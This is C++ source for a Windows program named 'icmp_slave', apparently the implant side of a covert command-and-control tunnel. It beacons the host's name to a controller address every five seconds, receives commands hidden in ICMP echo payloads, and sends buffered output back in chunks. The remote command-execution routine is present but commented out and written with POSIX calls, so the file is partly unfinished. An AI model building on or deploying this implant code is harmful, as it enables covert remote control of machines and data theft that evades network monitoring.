#include <cstdint>
#include <cstdio>
#include <cstring>
#include <iostream>
#include <vector>
#include <thread>
#include <mutex>

#include <winsock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <IcmpAPI.h>

#define DATA_SIZE 64
#define HEADER_SIZE 6
#define BUF_SIZE (DATA_SIZE + HEADER_SIZE)
#define BEACON_TIME 5000

struct buffer
{
    size_t pos{ 0 };
    bool ready{ false };
    std::vector<uint8_t> data;
};

static buffer out_buf;
static buffer in_buf;
static std::mutex buffer_mutex;

static std::string beacon_msg;

static uint32_t id;

void handle_data() {
    //     std::lock_guard<std::mutex> guard(buffer_mutex);
    //     std::string data{ (char *)in_buf.data.data(), in_buf.data.size() };

    //     std::cout << "Received: " << data << "\n";

    //     std::string cmd = data.substr(0, data.find(' '));
    //     std::string arg = data.substr(data.find(' ') + 1);

    //     if (cmd == "run") {
    //         std::cout << "Running command: " << arg << "\n";
    //         FILE *f;
    //         if (!(f = popen(arg.c_str(), "r"))) {
    //             return;
    //         }
    //         int d = fileno(f);
    //         fcntl(d, F_SETFL, O_NONBLOCK);


    //         uint8_t buf[512];
    //         ssize_t nbytes;
    //         while (1) {
    //             nbytes = read(d, buf, sizeof(buf));

    //             if (nbytes == -1 && errno == EAGAIN) {
    //                 continue;
    //             } else if (nbytes > 0) {
    //                 out_buf.data.insert(out_buf.data.end(), &buf[0], &buf[nbytes]);
    //             } else {
    //                 break;
    //             }
    //         }

    //         out_buf.ready = true;

    //         pclose(f);
    //     }
    //     in_buf.data.clear();
}

uint32_t icmp_send_recv(HANDLE icmp_chan, uint32_t dest_ip, uint8_t *out, uint32_t out_size, uint8_t *in, uint32_t in_size, uint32_t timeout) {
    uint8_t *tmp_buf = new uint8_t[sizeof(ICMP_ECHO_REPLY) + out_size];

    uint32_t ret = IcmpSendEcho(icmp_chan, dest_ip, out, out_size, nullptr, tmp_buf, sizeof(ICMP_ECHO_REPLY) + out_size, timeout);

    if (ret == 0) {
        delete[] tmp_buf;
        return 0;
    }

    PICMP_ECHO_REPLY reply = (PICMP_ECHO_REPLY)tmp_buf;
    if (reply->DataSize <= in_size) {
        memcpy(in, reply->Data, reply->DataSize);
    }

    ret = reply->DataSize;

    delete[] tmp_buf;
    return ret;
}

void usage(int exit_code) {
    puts("usage: icmp_slave [-h] dst_ip\n");
    exit(exit_code);
}

int main(int argc, char **argv) {
    // Check args
    if (argc < 2) {
        usage(-1);
    }

    if (strcmp(argv[1], "-h") == 0) {
        usage(0);
    }

    uint32_t dest_ip = inet_addr(argv[1]);

    HANDLE icmp_chan = IcmpCreateFile();

    char hostname[256];
    gethostname(hostname, sizeof(hostname));

    beacon_msg = hostname;

    uint8_t out[BUF_SIZE];
    uint8_t in[BUF_SIZE];
    uint8_t flush = 0x00;
    uint8_t out_size = 0;

    while (1) {
        Sleep(BEACON_TIME);

        std::memset(out, 0, BUF_SIZE);
        std::memset(in, 0, BUF_SIZE);

        if (id) {
            std::memcpy(&out[0], &id, sizeof(id));

            if (flush == 0x01) {
                flush = 0x00;
            }

            if (out_buf.ready && out_buf.pos < out_buf.data.size()) {
                std::lock_guard<std::mutex> guard(buffer_mutex);
                out_size = (out_buf.data.size() - out_buf.pos) > DATA_SIZE ? DATA_SIZE : (out_buf.data.size() - out_buf.pos);
                std::memcpy(&out[HEADER_SIZE], out_buf.data.data() + out_buf.pos, out_size);
                out_buf.pos += out_size;
                flush = 0x00;
                if (out_buf.pos >= out_buf.data.size()) {
                    std::puts("Flushing data to server!");
                    out_buf.data.clear();
                    out_buf.pos = 0;
                    out_buf.ready = false;
                    flush = 0x01;
                }
            } else {
                std::memcpy(&out[0], beacon_msg.c_str(), beacon_msg.size());
                flush = 0x02;
            }
            std::memcpy(&out[4], &flush, sizeof(flush));
            std::memcpy(&out[5], &out_size, sizeof(out_size));
        }

        uint32_t nbytes = icmp_send_recv(icmp_chan, dest_ip, out, BUF_SIZE, in, BUF_SIZE, 3);
        std::cout << "Received: " << nbytes << " bytes\n";

        if (nbytes < BUF_SIZE) continue;

        if (!id) {
            std::memcpy(&id, &in[0], sizeof(id));
            std::cout << "Established connection with id=" << id << "\n";
            continue;
        }

        if (in[4] == 0x00) {
            std::lock_guard<std::mutex> guard(buffer_mutex);
            uint8_t in_size = in[5];
            if (in_size != 0) {
                in_buf.data.insert(in_buf.data.end(), &in[HEADER_SIZE], &in[HEADER_SIZE + in_size]);
            }
        } else if (in[4] == 0x01) {
            std::thread handle_data_thread(handle_data);
            handle_data_thread.detach();
        }
    }

    return 0;
}
